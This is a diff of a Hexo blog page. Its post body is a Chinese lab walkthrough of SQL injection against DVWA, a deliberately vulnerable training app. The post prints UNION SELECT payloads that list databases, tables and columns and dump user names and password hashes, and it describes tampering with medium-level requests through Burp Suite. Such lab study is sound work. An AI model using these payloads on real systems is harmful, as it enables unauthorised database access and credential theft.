@@ -1,125 +1,351 @@
-<!DOCTYPE html>
-<html lang="en">
+
+
+
+
+
+
+
+<!doctype html>
+<html lang>
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="utf-8">
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="author" content="csy">
   
   
   
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <title>
-    dvwa.  sql注入 |
-    
-    Hexo</title>
   
-    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="description" content="dvwa.  sql注入1.low级别1.查询当前数据库1’ union select 1, database()#&emsp;&emsp;2.查询该数据库有几个字段，查找注入点，输入1’ 报错&emsp;后面加个#就能识别，此时注入点已经找到下面查询数据库有几列，三列不存在两列是有的，所有确定是两列&emsp;&emsp;3.下面查询所有的数据库名字1’ union select 1,sc...">
   
-  <link rel="stylesheet" href="/css/style.css">
-  <link rel="stylesheet" href="/css/technology.css">
+  <title>dvwa.  sql注入 [ Hexo ]</title>
   
-    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
   
-  <script src="/js/pace.min.js"></script>
+    <link rel="shortcut icon" href="/hollow.ico">
+  
+  
+  <link rel="stylesheet" href="/css/random.css">
+<link rel="stylesheet" href="/css/vegas.min.css">
+<link rel="stylesheet" href="/css/highlight-railscasts.css">
+<link rel="stylesheet" href="/css/jquery.fancybox.css">
+<link rel="stylesheet" href="/css/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/jquery.fancybox-thumbs.css">
+<link rel="stylesheet" href="/css/plyr.css">
+  
 </head>
-</html>
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <section class="outer">
-  <article id="post-dvwa.  sql" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
-
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+<div class="side-navigate hide-area">
   
-    <h1 class="article-title" itemprop="name">
-      dvwa.  sql注入
-    </h1>
+    <div class="item prev">
+      <a href="/2019/05/20/centos7-dokuwiki/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        centos7中安装dokuwiki
+      </div>
+    </div>
   
-
-      </header>
-    
-
-    
-      <div class="article-meta">
-        <a href="/2019/05/19/dvwa.  sql/" class="article-date">
-  <time datetime="2019-05-19T08:05:18.000Z" itemprop="datePublished">2019-05-19</time>
-</a>
+  
+    <div class="item next">
+      <a href="/2019/05/18/centos7-PHP-nginx/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        centos7中安装PHP和nginx
+      </div>
+    </div>
+  
+</div>
+<div id="outer-container" class="hide-area">
+<div id="container">
+  <div id="menu-outer" class="slide-down">
+    <div id="menu-inner">
+      <div id="brand">
         
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/漏洞渗透/">漏洞渗透</a>
+        <a onclick="openUserCard()">
+          <img id="avatar" src="https://avatars3.githubusercontent.com/u/13285397?s=460&v=4">
+          <div id="homelink">Hexo</div>
+        </a>
+      </div>
+      <div id="menu-list">
+        <ul>
+        
+        
+          
+            <li>
+          
+            <a href="/index.html">Home</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/archives">Archives</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/tags">Tags</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/categories">Categories</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/about">About</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="https://github.com/Baileyswu">Github</a>
+            
+          </li>
+        
+        </ul>
+      </div>
+      <div id="show-menu">
+        <button>Menu</button>
+      </div>
+    </div>
   </div>
 
-      </div>
+  <div id="content-outer">
+    <div id="content-inner">
+      
+      
+  
+
+  <article id="post">
+    <h1>dvwa.  sql注入</h1>
+    <p class="page-title-sub">
+      <span id="post-title-date">Created at 2019-05-19</span>
+      
+        <span id="post-title-updated">Updated at 2019-08-15</span>
+      
+      
+      <span id="post-title-categories">Category
+      
+      
+        
+        
+        <a href="/categories/漏洞渗透/">漏洞渗透</a>
+      
+      </span>
+      
+      
+      <span id="post-title-tags">
+      Tag
+      
+      
+        
+        
+        <a href="/tags/dvwa-sql注入/">dvwa.  sql注入</a>
+      
+      </span>
+      
+    </p>
     
-
-    <div class="article-entry" itemprop="articleBody">
-      
-
-      
-
-      
-        <hr>
+    <hr>
 <h1 id="dvwa-sql注入"><a href="#dvwa-sql注入" class="headerlink" title="dvwa.  sql注入"></a>dvwa.  sql注入</h1><p>1.low级别<br>1.查询当前数据库<br>1’ union select 1, database()#<br><a href="https://imgchr.com/i/mAdeJg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdeJg.png" alt="mAdeJg.png"></a><br>&emsp;<br>&emsp;<br>2.查询该数据库有几个字段，查找注入点，输入1’ 报错<br><a href="https://imgchr.com/i/mAd1e0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAd1e0.png" alt="mAd1e0.png"></a><br>&emsp;<br>后面加个#就能识别，此时注入点已经找到<br><a href="https://imgchr.com/i/mAdYYF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdYYF.png" alt="mAdYYF.png"></a><br>下面查询数据库有几列，三列不存在<br><a href="https://imgchr.com/i/mAdwO1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdwO1.png" alt="mAdwO1.png"></a><br>两列是有的，所有确定是两列<br><a href="https://imgchr.com/i/mAd6YD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAd6YD.png" alt="mAd6YD.png"></a><br>&emsp;<br>&emsp;<br>3.下面查询所有的数据库名字<br>1’ union select 1,schema_name（） from information_schema.columns#<br> union select联合查询      schema_name 数据库名字 。     information_schema.columns<br> <a href="https://imgchr.com/i/mAdITf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdITf.png" alt="mAdITf.png"></a><br> &emsp;<br> &emsp;<br> 4.数据库下的表查询，联合查询所有数据库中的表！<br>1’ union select 1,table_name form information_schema.tables#<br><a href="https://imgchr.com/i/mAdz7V" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAdz7V.png" alt="mAdz7V.png"></a><br>&emsp;<br>&emsp;<br>5.查询表中的字段<br>1’ union select 1,column_name from information_schema.columns#<br><a href="https://imgchr.com/i/mAwVn1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwVn1.png" alt="mAwVn1.png"></a><br>&emsp;<br>&emsp;<br>6.查询dvwa数据库中的表 table_schema(数据库名<br>1’ union select 1, table_name from information_schema.tables where table_schema=’dvwa’#<br><a href="https://imgchr.com/i/mAw3jA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAw3jA.png" alt="mAw3jA.png"></a><br>&emsp;<br>&emsp;<br>7.查询数据库dvwa下user表下的字段table-name表名<br>1’ union select 1, column_name from information_schema.columns where table_name=’users’#<br><a href="https://imgchr.com/i/mAwBcj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwBcj.png" alt="mAwBcj.png"></a><br>&emsp;<br>&emsp;<br>8.查询dvwa库下的账户和密码<br>1’ union select user, password from users; #<br><a href="https://imgchr.com/i/mAwh34" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwh34.png" alt="mAwh34.png"></a><br>&amp;emsp<br>&amp;emsp<br>(2) .   1’ union select group_concat(user_id,user),group_concat(password) from users;#<br><a href="https://imgchr.com/i/mAwL4O" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwL4O.png" alt="mAwL4O.png"></a><br>2.medium级别<br><a href="https://imgchr.com/i/mA03PU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA03PU.png" alt="mA03PU.png"></a><br>可以看出没有回显，可以用burp抓包拦截，把数值调为一，burp开始拦截，发送到repeater里面<br>&emsp;<br>&emsp;<br><a href="https://imgchr.com/i/mA0DPO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0DPO.png" alt="mA0DPO.png"></a><br>改最下面一列的内容,右侧数据库已经显示出来了<br><a href="https://imgchr.com/i/mA0bss" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0bss.png" alt="mA0bss.png"></a><br>&emsp;<br>&emsp;<br>2.查看数据库的字段,改最后一列<br><a href="https://imgchr.com/i/mA0zJU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0zJU.png" alt="mA0zJU.png"></a></p>
 
+  </article>
+  <div class="random-toc-area">
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">Show TOC</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
+  <div class="random-toc">
+    <h2>Table of Content</h2>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dvwa-sql注入"><span class="toc-text">dvwa.  sql注入</span></a></li></ol>
+  </div>
+</div>
+
+  
+<nav id="pagination">
+  
+    <a href="/2019/05/20/centos7-dokuwiki/" class="prev">&larr; Prev post centos7中安装dokuwiki</a>
+  
+
+  
+
+  
+    <a href="/2019/05/18/centos7-PHP-nginx/" class="next">Next post centos7中安装PHP和nginx &rarr;</a>
+  
+</nav>
+
+  <!-- JiaThis Button BEGIN -->
+
+<!-- JiaThis Button END -->
+
+
+      
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/05/19/dvwa.  sql/" data-id="cjzcf4msf000l3ov6wjmn9blk"
-         class="article-share-link">分享</a>
+  </div>
+
+  <div id="bottom-outer">
+    <div id="bottom-inner">
+      Site by csy using
+      <a href="http://hexo.io">Hexo</a> & <a href="https://github.com/stiekel/hexo-theme-random">Random</a>
+      <br>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dvwa-sql注入/">dvwa.  sql注入</a></li></ul>
-
-    </footer>
-
-  </div>
-
-  
-    
-  <nav class="article-nav">
-    
-      <a href="/2019/05/20/centos7-dokuwiki/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            centos7中安装dokuwiki
-          
-        </div>
-      </a>
-    
-    
-      <a href="/2019/05/18/centos7-PHP-nginx/" class="article-nav-link">
-        <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">centos7中安装PHP和nginx</div>
-      </a>
-    
-  </nav>
-
-
-  
-
-  
-    
-  
-
-</article>
-
-
-
-</section>
     </div>
-    <script src="/js/jquery-2.0.3.min.js"></script>
-<script src="/js/lazyload.min.js"></script>
-<script src="/js/busuanzi-2.3.pure.min.js"></script>
-
-
-  <script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/technology.js"></script>
-
   </div>
+</div>
+
+</div>
+
+
+<div id="user-card">
+  <div class="center-field">
+    <img class="avatar" src="https://avatars3.githubusercontent.com/u/13285397?s=460&v=4">
+    <p id="description"></p>
+    <ul class="social-icon">
+  
+  
+    <li>
+      <a href="https://github.com/Baileyswu">
+        
+          <i class="icon iconfont github">&#xe606;</i>
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="http://weibo.com/Danliwoo">
+        
+          <i class="icon iconfont weibo">&#xe602;</i>
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="mailto:wulidan0530@live.com">
+        
+          M
+        
+      </a>
+    </li>
+  
+</ul>
+  </div>
+</div>
+
+
+<div id="btn-view">Hide</div>
+
+<script>
+// is trigger analytics / tongji script
+var isIgnoreHost = false;
+
+if(window && window.location && window.location.host) {
+  isIgnoreHost = ["localhost","127.0.0.1"].some(function(address){
+    return 0 === window.location.host.indexOf(address);
+  });
+}
+
+var isTriggerAnalytics = !( true && isIgnoreHost );
+
+</script>
+
+
+
+
+  
+  
+    <script src="/js/jquery-2.2.3.min.js"></script>
+  
+    <script src="/js/vegas.min.js"></script>
+  
+    <script src="/js/random.js"></script>
+  
+    <script src="/js/highlight.pack.js"></script>
+  
+    <script src="/js/jquery.mousewheel.pack.js"></script>
+  
+    <script src="/js/jquery.fancybox.pack.js"></script>
+  
+    <script src="/js/jquery.fancybox-thumbs.js"></script>
+  
+    <script src="/js/plyr.js"></script>
+  
+
+<script>
+
+  // fancybox
+  var backgroundImages = [];
+  
+  $('#post').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox') || $(this).parent().hasClass('fancybox-thumb')) return;
+      var alt = this.alt || this.title;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'post' + i);
+    });
+  });
+  $(".fancybox").fancybox();
+
+var vegasConfig = {"preload­Image":true,"transition":["flash"],"timer":true,"delay":1500000,"shuffle":true,"count":12};
+var unsplashConfig = {"gravity":"center"};
+// is show background images
+var turnoffBackgroundImage = false;
+
+
+
+
+var backgroundColor = "34495E";
+
+$(".fancybox-thumb").fancybox({
+  prevEffect: 'none',
+  nextEffect: 'none',
+  helpers: {
+    title: {
+      type: 'outside'
+    },
+    thumbs: {
+      width: 50,
+      height: 50
+    }
+  }
+});
+
+// show video with plyr
+$(".video-container iframe").each(function(i){
+  var url = $(this).attr('src');
+  var id = url.split('/').pop();
+  var plyrContainer = document.createElement('div');
+  plyrContainer.className = 'plyr';
+  var plyrElement = document.createElement('div');
+  plyrElement.dataset.videoId = id;
+  switch(true) {
+    case url.search('youtube.com') >= 0:
+      plyrElement.dataset.type = 'youtube';
+      break;
+    case url.search('vimeo.com') >= 0:
+      plyrElement.dataset.type = 'vimeo';
+      break;
+    default:
+      return;
+  };
+  plyrContainer.appendChild(plyrElement);
+  $(this).parent().html(plyrContainer);
+});
+plyr.setup('.plyr', {iconUrl: '/css/sprite.svg'});
+</script>
 </body>
 </html>
+
